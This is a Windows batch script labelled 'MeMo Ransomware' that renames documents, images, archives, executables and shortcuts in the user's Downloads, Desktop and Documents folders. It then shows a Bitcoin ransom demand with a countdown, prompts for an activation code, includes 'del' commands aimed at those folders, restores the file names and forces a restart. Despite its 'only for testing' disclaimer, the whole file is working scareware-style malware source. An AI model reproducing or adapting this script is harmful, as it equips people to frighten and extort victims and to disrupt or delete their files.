@echo off
title MeMo Ransomware
color 0C
echo This is only for testing, we will not be responsible for anything casused
echo I don't want to unleash it CLOSE THE TAB
echo I want to unleash it TYPE ANYTHING
color C0
Pause
Pause
goto process
:process
cd C:\Users\%Username%\Downloads 
ren *.txt *.ransomware1
ren *.docx *.ransomware2
ren *.png *.ransomware3
ren *.jpeg *.ransomware4
ren *.gif *.ransomware5
ren *.pptx *.ransomware6
ren *.pdf *.ransomware7
ren *.jpg *.ransomware8
ren *.exe *.ransomware9
ren *.zip *.ransomware10
ren *.lnk *.ransomware11

cd C:\Users\%Username%\Desktop 
ren *.txt *.ransomware1
ren *.docx *.ransomware2
ren *.png *.ransomware3
ren *.jpeg *.ransomware4
ren *.gif *.ransomware5
ren *.pptx *.ransomware6
ren *.pdf *.ransomware7
ren *.jpg *.ransomware8
ren *.exe *.ransomware9
ren *.zip *.ransomware10
ren *.lnk *.ransomware11

cd C:\Users\%Username%\Documents
ren *.txt *.ransomware1
ren *.docx *.ransomware2
ren *.png *.ransomware3
ren *.jpeg *.ransomware4
ren *.gif *.ransomware5
ren *.pptx *.ransomware6
ren *.pdf *.ransomware7
ren *.jpg *.ransomware8
ren *.exe *.ransomware9
ren *.zip *.ransomware10
ren *.lnk *.ransomware11
cls
Color A
@echo You have 5 minute to pay or else...
echo Bitcoin: fdhsghfvghvghvGHvhgvhgvHGVhgvGHVsde
Color C
@echo Say bye bye to your files.
Color A
@echo Starts Now!
cls
Color C
Title 5 minutes to go!
echo 5 minutes to go!
ping localhost -n 60 >nul
echo 4 min
title 4 min
ping localhost -n 60 >nul
echo 3 min
title 4 min
ping localhost -n 60 >nul
echo 2 min
title 2 min
ping localhost -n 60 >nul
echo 1 min
title 1 min
ping localhost -n 60 >nul
echo 0 min
title 0 min
cls
echo Please enter the activation code now
echo Or else your files will be deleter
set/p Choice=:
if %choice%==09831 goto :safe
else del C:\Users\%Username%\Documents
else del C:\Users\%Username%\Downloads
else del C:\Users\%Username%\Desktop

:safe
echo We are fixing your computer now, please wait
echo Status:
echo ::
ping localhost -n 5 >nul 
echo ::::
ping localhost -n 5 >nul 
echo ::::::
ping localhost -n 5 >nul 
echo ::::::::
ping localhost -n 5 >nul 
echo ::::::::::
ping localhost -n 5 >nul 
echo ::::::::::::
ping localhost -n 5 >nul 
echo ::::::::::::::
ping localhost -n 5 >nul 
cd C:\Users\%Username%\Downloads 
ren *.ransomware1 *.txt
ren *.ransomware2 *.docx
ren *.ransomware3 *.png
ren *.ransomware4 *.jpeg
ren *.ransomware5 *.gif
ren *.ransomware6 *.pptx
ren *.ransomware7 *.pdf
ren *.ransomware8 *.jpg
ren *.ransomware9 *.exe
ren *.ransomware10 *.zip
ren *ransomware11 *.lnk

cd C:\Users\%Username%\Desktop 
ren *.ransomware1 *.txt
ren *.ransomware2 *.docx
ren *.ransomware3 *.png
ren *.ransomware4 *.jpeg
ren *.ransomware5 *.gif
ren *.ransomware6 *.pptx
ren *.ransomware7 *.pdf
ren *.ransomware8 *.jpg
ren *.ransomware9 *.exe
ren *.ransomware10 *.zip
ren *ransomware11 *.lnk

cd C:\Users\%Username%\Documents
ren *.ransomware1 *.txt
ren *.ransomware2 *.docx
ren *.ransomware3 *.png
ren *.ransomware4 *.jpeg
ren *.ransomware5 *.gif
ren *.ransomware6 *.pptx
ren *.ransomware7 *.pdf
ren *.ransomware8 *.jpg
ren *.ransomware9 *.exe
ren *.ransomware10 *.zip
ren *ransomware11 *.lnk
cls
echo We are now restarting the PC for you, please wait.
shutdown /r /c "Restarting..."